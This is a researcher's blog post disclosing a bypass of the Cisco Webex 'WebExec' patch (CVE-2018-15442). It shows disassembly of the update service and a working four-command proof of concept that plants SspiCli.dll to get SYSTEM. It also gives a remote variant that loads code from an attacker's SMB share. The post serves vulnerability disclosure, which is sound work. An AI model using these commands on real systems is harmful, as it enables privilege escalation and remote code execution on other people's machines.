---
layout: post
title: "WebExec Reloaded :: Cisco Webex Meetings Desktop App Update Service DLL Planting Elevation of Privilege Vulnerability"
date: 2018-12-03 10:00:00 -0500
categories: blog
---

![Cisco Webex](/assets/images/webexec-reloaded/webex-logo.png "Cisco Webex") 

Some time ago [Ron Bowes](https://twitter.com/iagox86) found a vulnerability in Cisco WebEx Meetings Desktop App that could allow local privilege escalation, or, if you have a user account you can use psexec to gain remote code execution as SYSTEM. He named the vulnerability **WebExec** (cute) and even gave it a pretty [website](https://webexec.org/)! The problem? Well, it turns out the patch wasn't so good...
<!--more-->

TL;DR; *I walk through the re-discovery and exploitation of [CVE-2018-15442](/advisories/src-2018-0034) which is a bypass for the original bug. Since the original vulnerability and the bypass are so similar, Cisco decided to not issue a new CVE and I tend to agree with this choice. Technically its a remote code execution but the way this bug is triggered makes more sense for exploitation to come from a local context.*

### Introduction

The [Webex site](https://www.webex.com/products/meetings/index.html) explains what webex is, quickly summing it up as:

> ...With Webex Meetings, joining is a breeze, audio and video are clear, and screen sharing is easier than ever. We help you forget about the technology, to focus on what matters...

Please Cisco, at least don't forget about the security of your technology!

So, after reading Ron's [blog post](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec) we know that the underlying issue was that the **WebExService** takes a user controlled binary and executes it as SYSTEM. I really don't think it gets easier than that for a vulnerability, hooray Cisco!

### Re-discovering the Vulnerability

According to Ron the patched version checks for a signed executable by WebEx.

> The patched version of WebEx still allows remote users to connect to the process and start it. However, if the process detects that it's being asked to run an executable that is not signed by WebEx, the execution will halt. Unfortunately, that gives us no information about whether a host is vulnerable!

Well, let's do what we normally do and check the patch for ourselves. After installing the latest [version](https://akamaicdn.webex.com/client/WBXclient-33.6.2-16/webexapp.msi) at the time from Cisco's CDN, we can check that we have no more updates to do:

![Version 33.6.2.16 was the latest at the time](/assets/images/webexec-reloaded/latest-webex.png "Version 33.6.2.16 was the latest at the time") 

Diving into the binary stored at `C:\Program Files\Webex\Webex\Applications\WebExService.exe` we see some interesting things. The first thing I noticed is that the code only looks for one argument type, that is, `software-update`.

```
.text:00402DC4 loc_402DC4:                                          ; CODE XREF: sub_402D80+1C
.text:00402DC4                 push    offset aSoftwareUpdate       ; "software-update"
.text:00402DC9                 push    dword ptr [esi+8]            ; lpString1
.text:00402DCC                 call    ds:lstrcmpiW
.text:00402DD2                 test    eax, eax
.text:00402DD4                 jnz     loc_402E66
.text:00402DDA                 push    208h                         ; Size
.text:00402DDF                 push    eax                          ; Val
.text:00402DE0                 lea     eax, [ebp+Dst]
.text:00402DE6                 push    eax                          ; Dst
.text:00402DE7                 call    memset
.text:00402DEC                 add     esp, 0Ch
.text:00402DEF                 lea     eax, [ebp+Dst]
.text:00402DF5                 push    offset pszFile               ; "ptupdate.exe"
.text:00402DFA                 push    dword ptr [esi+10h]          ; pszDir
.text:00402DFD                 push    eax                          ; pszDest
.text:00402DFE                 call    ds:PathCombineW
.text:00402E04                 sub     esp, 18h
.text:00402E07                 lea     eax, [ebp+Dst]
.text:00402E0D                 mov     ecx, esp                     ; Dst
.text:00402E0F                 mov     [esi+10h], eax
.text:00402E12                 push    eax                          ; Src
.text:00402E13                 call    sub_402EB0
.text:00402E18                 call    sub_402310                   ; signature check on ptupdate.exe
.text:00402E1D                 add     esp, 18h
.text:00402E20                 test    eax, eax
.text:00402E22                 jz      short loc_402E46             ; jump if we don't pass the check!
.text:00402E24                 lea     eax, [ebp+var_214]
.text:00402E2A                 mov     [ebp+var_214], 0
.text:00402E34                 push    eax
.text:00402E35                 push    ecx
.text:00402E36                 lea     ecx, [edi-3]
.text:00402E39                 lea     edx, [esi+0Ch]
.text:00402E3C                 call    sub_402960                   ; execute "ptupdate.exe" as winlogon.exe
```

Later, the code does a PathCombineW call with an argument that we supply on the command line with the string `ptupdate.exe`. That's about where I stopped reversing. I didn't even bother to reverse the signature check function or the function that does the impersonation and execution. I already had a plan of attack.

### Exploitation

So at this point, all we needed to do was copy the `C:\Program Files\Webex\Webex\Applications\*` (including the ptUpdate.exe binary) into a user controlled folder that the guest or local user owns (this can be a sandboxed directory also) and either find a DLL planting vulnerability or force one by deleting one of the DLL's.

I don't like unexpected application behavior when I can avoid it, so I simply looked for a DLL planting issue that wouldn't affect application state. To do that I ran my litte proof of concept:

```bat
mkdir %cd%\\si
copy C:\\PROGRA~1\\Webex\\Webex\\Applications\\* %cd%\\si\\*
sc start webexservice a software-update 1 %cd%\\si
```

As it turns out, `SspiCli.dll` looked like a decent target.

![ptUpdate.exe can't find SspiCli.dll in the cwd](/assets/images/webexec-reloaded/dll-planting.png "ptUpdate.exe can't find SspiCli.dll in the cwd") 

Of course, we could have just cross referenced the 43 LoadLibraryW calls and leveraged one of those too. Unfortunately my proof of concept exploit needed to be 4 commands, instead of 3. Booooooo Cisco!

```bat
mkdir %cd%\\si
copy C:\\PROGRA~1\\Webex\\Webex\\Applications\\* %cd%\\si\\*
copy SspiCli.dll %cd%\\si
sc start webexservice a software-update 1 %cd%\\si
```

![lpe as SYSTEM via dll planting](/assets/images/webexec-reloaded/webex-lpe.png "lpe as SYSTEM via dll planting") 

As mentioned, you could technically leverage this for RCE as SYSTEM as well, but its authenticated anyway. `sc \\victim start webexservice a software-update 1 "\\attacker\share\si"`.

### Conclusion

Whenever you control a path to a file operation that's being performed by a high privileged service, you are bound to be vulnerable to attacks. This vulnerability is so simple and powerful in that it can be triggered from remote using SMB as well as allow for a nice sandbox escape. I'm convinced that logical vulnerabilities will be the future of serious exploitation since they really do side step 99% of operating system level mitigations.

I find it incredible that Cisco couldn't patch this right the first time. All they needed to do was use a fixed path to the `C:\Program Files\Webex\Webex\Applications` directory and remove user controlled input all together. This vulnerability was found in about 10 minutes and I couldn't help but rename the vulnerability to *WebExec reloaded*, get it? ...re-loading an arbitrary DLL by an attacker!?

Finally, a big thanks to [iDefense](https://vcp.idefense.com/login.jsf) for helping with the coordination of the vulnerability!

### References

- [https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection)
- [https://blog.skullsecurity.org/2018/technical-rundown-of-webexec](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec)